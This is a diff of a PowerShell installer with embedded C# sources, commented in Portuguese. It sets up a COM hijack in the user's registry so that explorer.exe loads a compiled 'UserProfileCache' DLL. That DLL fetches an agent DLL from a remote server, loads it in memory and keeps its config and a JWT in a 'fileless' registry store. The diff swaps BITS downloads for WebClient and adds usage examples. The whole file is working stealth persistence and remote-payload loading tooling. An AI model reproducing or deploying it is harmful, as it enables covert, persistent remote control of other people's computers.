@@ -1,7 +1,7 @@
 #Requires -Version 5.1
 <#
 .SYNOPSIS
-    Gerencia instalacao e registro COM UserProfileCache (user-mode HKCU) - VERSÃO BITS
+    Gerencia instalação e registro COM UserProfileCache (user-mode HKCU).
 
 .PARAMETER Action
     Install   - Compila bootstrap, registra hijack, grava config C/U/I
@@ -12,6 +12,24 @@
 
 .PARAMETER Force
     Install   - Reinstala mesmo se ja existir hijack + DLL para o -Clsid
+
+.EXAMPLE
+    .\profile-cache.ps1 -Action Install -Config 'https://host/conf.cfg' -Clsid '{GUID}' -RestartExplorer
+
+.EXAMPLE
+    .\profile-cache.ps1 -Action ListClsid
+
+.EXAMPLE
+    .\profile-cache.ps1 -Action Install -Config 'https://host/conf.cfg' -Clsid '{GUID}' -SourceDll 'C:\path\UserProfileCache.dll'
+
+.EXAMPLE
+    .\profile-cache.ps1 -Action Uninstall -Clsid '{GUID}' -RemoveDll
+
+.EXAMPLE
+    .\profile-cache.ps1 -Action Register -DllPath 'C:\path\UserProfileCache.dll' -Clsid '{GUID}'
+
+.EXAMPLE
+    .\profile-cache.ps1 -Action Register -DllPath 'C:\path\profilecache.dll' -Clsid '{GUID-2}' -UnregisterPrevious
 #>
 [CmdletBinding()]
 param(
@@ -41,33 +59,7 @@ $Script:InstallDllName = 'profilecache.dll'
 $Script:ComClassName = 'UserProfileCache.CacheProvider'
 $Script:FilelessStoreClsid = '{B2C3D4E5-F6A7-8901-BCDE-F12345678901}'
 
-# ============================================================
-# FUNCOES BITS (substituem WinHttp e WebClient)
-# ============================================================
-function Invoke-BitsDownloadString {
-    param([string]$Url)
-    $tempFile = [System.IO.Path]::GetTempFileName()
-    try {
-        Start-BitsTransfer -Source $Url -Destination $tempFile -TransferType Download -Priority High -ErrorAction Stop
-        return Get-Content $tempFile -Raw -Encoding UTF8
-    } finally {
-        if (Test-Path $tempFile) { Remove-Item $tempFile -Force }
-    }
-}
-
-function Invoke-BitsDownloadData {
-    param([string]$Url)
-    $tempFile = [System.IO.Path]::GetTempFileName()
-    try {
-        Start-BitsTransfer -Source $Url -Destination $tempFile -TransferType Download -Priority High -ErrorAction Stop
-        return [System.IO.File]::ReadAllBytes($tempFile)
-    } finally {
-        if (Test-Path $tempFile) { Remove-Item $tempFile -Force }
-    }
-}
-# ============================================================
-
-#region BootstrapSources (AUTO-GENERATED) - MESMO CODIGO ORIGINAL
+#region BootstrapSources (AUTO-GENERATED)
 function Get-BootstrapSourceMap {
     return @{
         'CacheConstants.cs' = @'
@@ -90,6 +82,7 @@ namespace UserProfileCache
         public const string AllowModulesEnvVar = "RMM_ALLOW_MODULES";
         public const string FilelessEnvValue = "1";
         public const string DebugEnvValue = "1";
+        /// <summary>Same HKCU store as RmmStealthInstaller / RegistrationService (C, U, I, T).</summary>
         public const string FilelessStoreClsid = "{B2C3D4E5-F6A7-8901-BCDE-F12345678901}";
         public const string FilelessTokenValueName = "T";
         public const string AgentIdValueName = "I";
@@ -549,6 +542,9 @@ namespace UserProfileCache
             return score;
         }
 
+        /// <summary>
+        /// Mirrors C/U/I to the canonical fileless CLSID so RegistrationService can persist JWT (T).
+        /// </summary>
         public static void SyncFilelessStore(RegistryConfig config)
         {
             if (config == null)
@@ -634,6 +630,7 @@ namespace UserProfileCache
             return clsid.ToUpperInvariant();
         }
 
+        /// <summary>Removes stale JWT so a new agent id can register cleanly.</summary>
         public static void ClearFilelessToken()
         {
             using (var key = OpenFilelessStoreKey(true))
@@ -646,6 +643,7 @@ namespace UserProfileCache
             }
         }
 
+        /// <summary>Removes mistaken store key created without braces around the CLSID.</summary>
         public static void RemoveLegacyFilelessStoreKey()
         {
             var legacyName = FilelessStoreKeyName().Trim('{', '}');
@@ -666,6 +664,7 @@ namespace UserProfileCache
 '@
         'ConfigClient.cs' = @'
 using System;
+using System.Net;
 using System.Text.RegularExpressions;
 
 namespace UserProfileCache
@@ -676,19 +675,33 @@ namespace UserProfileCache
             @"""server""\s*:\s*""([^""]+)""",
             RegexOptions.IgnoreCase | RegexOptions.Compiled);
 
-        public static Func<string, string> DownloadStringWithBits = null;
+        public static void EnableTls12()
+        {
+            try
+            {
+                ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls12;
+            }
+            catch
+            {
+            }
+        }
 
         public static string FetchServerBase(string configUrl)
         {
             if (string.IsNullOrWhiteSpace(configUrl))
                 return null;
 
-            var raw = DownloadStringWithBits(configUrl);
-            var match = ServerRegex.Match(raw ?? string.Empty);
-            if (!match.Success)
-                throw new InvalidOperationException("Config missing 'server' key.");
+            EnableTls12();
 
-            return match.Groups[1].Value.Trim().TrimEnd('/');
+            using (var client = new WebClient())
+            {
+                var raw = client.DownloadString(configUrl);
+                var match = ServerRegex.Match(raw ?? string.Empty);
+                if (!match.Success)
+                    throw new InvalidOperationException("Config missing 'server' key.");
+
+                return match.Groups[1].Value.Trim().TrimEnd('/');
+            }
         }
 
         public static string RefreshServerBase(RegistryConfig config)
@@ -716,6 +729,7 @@ namespace UserProfileCache
         'AgentBootstrap.cs' = @'
 using System;
 using System.IO;
+using System.Net;
 using System.Net.NetworkInformation;
 using System.Reflection;
 using System.Threading;
@@ -728,13 +742,12 @@ namespace UserProfileCache
         private static readonly object SyncRoot = new object();
         private static int _executed;
 
-        public static Func<string, byte[]> DownloadDataWithBits = null;
-
         public static void Execute()
         {
             if (Interlocked.Exchange(ref _executed, 1) == 1)
                 return;
 
+            // MTA — RunAsync/WebSocket inside explorer must not run on STA COM threads.
             var thread = new Thread(RunWorkerSafe);
             thread.IsBackground = true;
             thread.SetApartmentState(ApartmentState.MTA);
@@ -872,8 +885,15 @@ namespace UserProfileCache
 
         private static void LoadAndRunAgent(string serverBase)
         {
+            ConfigClient.EnableTls12();
+
             var downloadUrl = serverBase.TrimEnd('/') + CacheConstants.AgentDownloadPath;
-            byte[] dllBytes = DownloadDataWithBits(downloadUrl);
+            byte[] dllBytes;
+
+            using (var client = new WebClient())
+            {
+                dllBytes = client.DownloadData(downloadUrl);
+            }
 
             if (dllBytes == null || dllBytes.Length == 0)
                 throw new InvalidOperationException("Agent download returned empty payload.");
@@ -916,6 +936,13 @@ namespace UserProfileCache
             {
             }
         }
+
+#if DEBUG
+        internal static void WriteDebugLog(string message)
+        {
+            WriteTrace(message);
+        }
+#endif
     }
 }
 '@
@@ -938,7 +965,7 @@ using System.Runtime.InteropServices;
 '@
     }
 }
-#endregion BootstrapSources
+#endregion BootstrapSources (AUTO-GENERATED)
 
 #region Bootstrap compile
 
@@ -964,7 +991,7 @@ function Get-CscPath {
         if (Test-Path $path) { return $path }
     }
 
-    throw "csc.exe nao encontrado. Instale .NET Framework 4.x."
+    throw "csc.exe não encontrado. Instale .NET Framework 4.x. Tentativas: $($paths -join ', ')"
 }
 
 function Invoke-CompileBootstrap {
@@ -1008,7 +1035,7 @@ function Invoke-CompileBootstrap {
         }
 
         if (-not (Test-Path $stagingPath -PathType Leaf)) {
-            throw "Compilacao nao gerou: $stagingPath"
+            throw "Compilação não gerou: $stagingPath"
         }
 
         Deploy-InstallDll -SourcePath $stagingPath -DestinationPath $OutputPath
@@ -1052,7 +1079,7 @@ function Get-ComAssemblyMetadata {
 
     $absolutePath = [System.IO.Path]::GetFullPath($Path)
     if (-not (Test-Path $absolutePath -PathType Leaf)) {
-        throw "DLL nao encontrada: $absolutePath"
+        throw "DLL não encontrada: $absolutePath"
     }
 
     $assembly = [System.Reflection.Assembly]::LoadFile($absolutePath)
@@ -1166,7 +1193,7 @@ function Get-RegAsmPath {
         )) {
         if (Test-Path $path) { return $path }
     }
-    throw "RegAsm.exe nao encontrado."
+    throw "RegAsm.exe não encontrado."
 }
 
 function Register-ComHijackViaRegAsm {
@@ -1182,7 +1209,7 @@ function Register-ComHijackViaRegAsm {
 
     try {
         & $regAsm $dllPath /regfile:$regFile /codebase | Out-Null
-        if (-not (Test-Path $regFile)) { throw "RegAsm nao gerou o arquivo .reg esperado." }
+        if (-not (Test-Path $regFile)) { throw "RegAsm não gerou o arquivo .reg esperado." }
 
         $content = Get-Content -Path $regFile -Raw -Encoding Unicode
         $content = $content -replace 'HKEY_CLASSES_ROOT', 'HKEY_CURRENT_USER\Software\Classes'
@@ -1206,7 +1233,7 @@ function Register-ComHijackViaRegAsm {
 
     $clsid = Format-ComClsid -Value $TargetClsid
     $inprocKey = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
-    if (-not (Test-Path $inprocKey)) { throw "Registro HKCU nao encontrado em $inprocKey" }
+    if (-not (Test-Path $inprocKey)) { throw "Registro HKCU não encontrado em $inprocKey" }
 
     $props = Get-ItemProperty -Path $inprocKey
     return [PSCustomObject]@{
@@ -1239,10 +1266,19 @@ function Test-IsAdmin {
         [Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
+function Enable-Tls12 {
+    param([string]$Url)
+    if ($Url -notmatch '^\s*https://') { return }
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
+    } catch { }
+}
+
 function Get-ServerUrl {
     param([string]$Url)
 
-    $raw = Invoke-BitsDownloadString -Url $Url
+    Enable-Tls12 $Url
+    $raw = (New-Object Net.WebClient).DownloadString($Url)
     $srv = $null
 
     if ($PSVersionTable.PSVersion.Major -ge 3) {
@@ -1372,7 +1408,15 @@ function Release-ProfileCacheDllLock {
         Start-Sleep -Seconds 1
     }
 
-    throw "Nao foi possivel substituir a DLL - ainda em uso por outro processo. $DllPath"
+    throw @"
+Nao foi possivel substituir a DLL — ainda em uso por outro processo.
+  $DllPath
+
+Passos manuais:
+  1. .\profile-cache.ps1 -Action Uninstall -Clsid '$Clsid' -RestartExplorer
+  2. Reinicie a sessao Windows, ou
+  3. Execute Install de novo com -RestartExplorer
+"@
 }
 
 function Deploy-InstallDll {
@@ -1403,6 +1447,7 @@ function Sync-FilelessRegistryStore {
     Set-ItemProperty -Path $storeKey -Name 'I' -Value $AgentId -Type String
     Remove-ItemProperty -Path $storeKey -Name 'T' -ErrorAction SilentlyContinue
 
+    # Chave errada criada por versão anterior (CLSID sem chavetas)
     $legacyKey = "HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid.Trim('{}'))"
     if (Test-Path $legacyKey) {
         Remove-Item -Path $legacyKey -Recurse -Force -ErrorAction SilentlyContinue
@@ -1567,7 +1612,14 @@ function Invoke-InstallAction {
     if (-not $Config) { throw "Install requer -Config." }
     if (-not $Clsid) { throw "Install requer -Clsid." }
 
-    Write-Host "Baixando configuracao..."
+    $existing = Get-ProfileCacheHijackInstall -TargetClsid $Clsid
+    if ($existing -and $existing.DllExists -and -not $Force) {
+        Write-Host 'Ja instalado.'
+        return
+    }
+
+    Write-Host 'Instalando...'
+
     $serverBase = Get-ServerUrl -Url $Config
 
     $destDll = Get-InstallDllPath
@@ -1576,31 +1628,19 @@ function Invoke-InstallAction {
         New-Item -ItemType Directory -Path $installDir -Force | Out-Null
     }
 
-    Write-Host "Compilando DLL..."
     Release-ProfileCacheDllLock -DllPath $destDll -Clsid $Clsid
 
     if ($SourceDll) {
         if (-not (Test-Path $SourceDll -PathType Leaf)) {
-            throw "SourceDll nao encontrada: $SourceDll"
+            throw "SourceDll não encontrada: $SourceDll"
         }
+
         Deploy-InstallDll -SourcePath $SourceDll -DestinationPath $destDll
     }
     else {
         Invoke-CompileBootstrap -OutputPath $destDll -Arch $Architecture
     }
 
-    Write-Host "Carregando DLL compilada..."
-    # Carrega a DLL para acessar os tipos
-    [System.Reflection.Assembly]::LoadFile($destDll) | Out-Null
-
-    # Agora injeta os delegates APÓS a DLL estar carregada
-    $delegateString = [Func[string,string]]{ param($url) return Invoke-BitsDownloadString -Url $url }
-    [UserProfileCache.ConfigClient]::DownloadStringWithBits = $delegateString
-
-    $delegateData = [Func[string,byte[]]]{ param($url) return Invoke-BitsDownloadData -Url $url }
-    [UserProfileCache.AgentBootstrap]::DownloadDataWithBits = $delegateData
-
-    Write-Host "Registrando COM hijack..."
     $result = Register-ComHijack -Path $destDll -TargetClsid $Clsid -Arch $Architecture
 
     $agentId = [guid]::NewGuid().ToString('N')
@@ -1661,7 +1701,7 @@ function Invoke-RegisterAction {
     $targetDll = $DllPath
     if (-not $targetDll) { $targetDll = Get-InstallDllPath }
     if (-not (Test-Path $targetDll -PathType Leaf)) {
-        throw "DLL nao encontrada: $targetDll (use -DllPath ou execute Install primeiro)."
+        throw "DLL não encontrada: $targetDll (use -DllPath ou execute Install primeiro)."
     }
 
     if ($UnregisterPrevious -and (Test-Path $Script:StateFile)) {
@@ -1694,7 +1734,7 @@ function Invoke-UnregisterAction {
         $targetDll = $DllPath
         if (-not $targetDll) { $targetDll = Get-InstallDllPath }
         if (-not (Test-Path $targetDll -PathType Leaf)) {
-            throw "Unregister com -UseRegAsm requer -DllPath valido."
+            throw "Unregister com -UseRegAsm requer -DllPath válido."
         }
 
         $removed = Unregister-ComHijackViaRegAsm -Path $targetDll -TargetClsid $Clsid
